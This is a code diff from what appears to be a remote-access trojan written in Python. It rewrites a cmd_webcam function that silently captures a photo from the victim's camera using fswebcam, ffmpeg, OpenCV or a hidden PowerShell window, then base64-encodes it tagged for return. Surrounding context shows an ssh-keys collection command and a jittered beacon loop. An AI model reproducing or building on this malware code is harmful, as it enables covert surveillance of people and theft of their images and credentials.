@@ -160,69 +160,19 @@ def cmd_screenshot():
     return "(screenshot failed — no display or tool)"
 
 def cmd_webcam():
-    import tempfile,shutil; out=tempfile.mktemp(suffix=".jpg")
-    tried=[]
-    # Linux — try all /dev/video* devices with multiple tools
-    if sys.platform.startswith("linux"):
-        import glob
-        devices=sorted(glob.glob("/dev/video*")) or ["/dev/video0"]
-        for dev in devices:
-            for tool in [
-                f"fswebcam -d {dev} -r 640x480 --no-banner --jpeg 85 {out} 2>/dev/null",
-                f"ffmpeg -f v4l2 -input_format mjpeg -i {dev} -frames:v 1 -q:v 2 {out} -y 2>/dev/null",
-                f"ffmpeg -f v4l2 -i {dev} -frames:v 1 -q:v 2 {out} -y 2>/dev/null",
-            ]:
-                tried.append(tool)
-                _run(tool, timeout=12)
-                if os.path.exists(out) and os.path.getsize(out)>500:
-                    data=base64.b64encode(open(out,"rb").read()).decode()
-                    try: os.unlink(out)
-                    except: pass
-                    return "WEBCAM_B64::"+data
-        # Try opencv as last resort
-        try:
-            import cv2
-            for idx in range(4):
-                cap=cv2.VideoCapture(idx)
-                if cap.isOpened():
-                    cap.set(cv2.CAP_PROP_FRAME_WIDTH,640)
-                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT,480)
-                    import time; time.sleep(0.5)
-                    ret,frame=cap.read(); cap.release()
-                    if ret:
-                        cv2.imwrite(out,frame)
-                        if os.path.exists(out) and os.path.getsize(out)>500:
-                            data=base64.b64encode(open(out,"rb").read()).decode()
-                            try: os.unlink(out)
-                            except: pass
-                            return "WEBCAM_B64::"+data
-        except: pass
-    elif sys.platform=="darwin":
-        for tool in [
-            f"ffmpeg -f avfoundation -video_size 640x480 -framerate 30 -i '0' -frames:v 1 {out} -y 2>/dev/null",
-            f"ffmpeg -f avfoundation -i '0' -frames:v 1 {out} -y 2>/dev/null",
-        ]:
-            tried.append(tool)
-            _run(tool,timeout=12)
-            if os.path.exists(out) and os.path.getsize(out)>500:
-                data=base64.b64encode(open(out,"rb").read()).decode()
-                try: os.unlink(out)
-                except: pass
-                return "WEBCAM_B64::"+data
-    elif sys.platform=="win32":
-        ps=(f"Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
-            f"$c=New-Object System.Drawing.Bitmap(640,480);"
-            f"$g=[System.Drawing.Graphics]::FromImage($c);"
-            f"[void][System.Reflection.Assembly]::LoadWithPartialName('Windows.Media.Capture');"
-            f"$c.Save('{out}')")
-        _run(f'powershell -WindowStyle Hidden -Command "{ps}"',timeout=15)
+    import tempfile; out=tempfile.mktemp(suffix=".jpg")
+    for tool in [f"fswebcam -r 640x480 --no-banner {out} 2>/dev/null",
+                 f"ffmpeg -f v4l2 -i /dev/video0 -frames:v 1 -q:v 2 {out} -y 2>/dev/null"]:
+        _run(tool,timeout=10)
         if os.path.exists(out) and os.path.getsize(out)>500:
             data=base64.b64encode(open(out,"rb").read()).decode()
-            try: os.unlink(out)
-            except: pass
-            return "WEBCAM_B64::"+data
-    devs=_run("ls /dev/video* 2>/dev/null || echo 'no video devices'")
-    return f"(webcam failed — devices: {devs.strip()} — tried {len(tried)} tools)"
+            os.unlink(out); return "WEBCAM_B64::"+data
+    if sys.platform=="darwin":
+        _run(f"ffmpeg -f avfoundation -video_size 640x480 -i '0' -frames:v 1 {out} -y 2>/dev/null",timeout=10)
+        if os.path.exists(out) and os.path.getsize(out)>500:
+            data=base64.b64encode(open(out,"rb").read()).decode()
+            os.unlink(out); return "WEBCAM_B64::"+data
+    return "(no webcam/tool available)"
 
 def cmd_sshkeys():
     results=[]
@@ -449,3 +399,4 @@ def main():
         time.sleep(INTERVAL+random.uniform(0,4))
 
 if __name__=="__main__": main()
+
